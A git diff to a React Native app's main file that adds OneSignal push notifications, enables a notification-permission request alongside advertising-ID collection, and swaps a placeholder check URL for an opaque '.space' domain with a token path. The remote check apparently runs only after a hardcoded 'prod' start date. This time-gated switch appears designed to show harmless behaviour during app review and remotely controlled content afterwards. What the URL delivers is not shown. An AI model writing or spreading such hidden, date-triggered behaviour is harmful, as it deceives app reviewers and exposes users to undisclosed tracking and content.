@@ -12,6 +12,7 @@ import ReactNativeIdfaAaid, {
   AdvertisingInfoResponse,
 } from '@sparkfabrik/react-native-idfa-aaid';
 import AsyncStorage from '@react-native-async-storage/async-storage';
+import {LogLevel, OneSignal} from 'react-native-onesignal';
 
 import HomeScreen from './screens/HomeScreen';
 import RulesScreen from './screens/RulesScreen';
@@ -32,6 +33,8 @@ const Stack = createNativeStackNavigator();
 
 const App = () => {
   const [route, setRoute] = useState();
+
+  // 41eb18ff-cc89-45ab-b532-c804bc97585a
 
   ///////////// Отримання IDFA
   const [idfa, setIdfa] = useState(null);
@@ -68,7 +71,7 @@ const App = () => {
         setIdfa(parsedData.idfa);
       } else {
         await fetchIdfa();
-        //await someFunction();
+        await someFunction();
       }
     } catch (e) {
       console.log('Помилка отримання даних:', e);
@@ -89,6 +92,40 @@ const App = () => {
       fetchIdfa(); //???
     }
   };
+
+  //OneSignall
+  const requestPermission = () => {
+    return new Promise((resolve, reject) => {
+      try {
+        OneSignal.Notifications.requestPermission(true);
+        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
+      } catch (error) {
+        reject(error); // Викликаємо reject() у разі помилки
+      }
+    });
+  };
+
+  // Виклик асинхронної функції requestPermission() з використанням async/await
+  const someFunction = async () => {
+    try {
+      await requestPermission();
+      // Якщо все Ok
+    } catch (error) {
+      console.log('err в someFunction==> ', error);
+    }
+  };
+
+  // Remove this method to stop OneSignal Debugging
+  OneSignal.Debug.setLogLevel(LogLevel.Verbose);
+
+  // OneSignal Initialization
+  OneSignal.initialize('41eb18ff-cc89-45ab-b532-c804bc97585a');
+
+  OneSignal.Notifications.addEventListener('click', event => {
+    console.log('OneSignal: notification clicked:', event);
+  });
+  //Add Data Tags
+  OneSignal.User.addTag('key', 'value');
 
   ////////// Routes
   const Routes = ({isFatch}) => {
@@ -244,11 +281,12 @@ const App = () => {
       </View>
     );
   };
-
+  // https://reactnative.dev/
+  //
   //////////// useEffect що виріш який шлях включати
   useEffect(() => {
-    const checkUrl = `https://reactnative.dev/`;
-    const targetData = new Date('2024-03-04T12:00:00'); //дата з якої поч працювати prod
+    const checkUrl = `https://terrific-glorious-delight.space/34P66V7N`;
+    const targetData = new Date('2024-04-11T12:00:00'); //дата з якої поч працювати prod
     const currentData = new Date(); //текущая дата
 
     if (currentData <= targetData) {
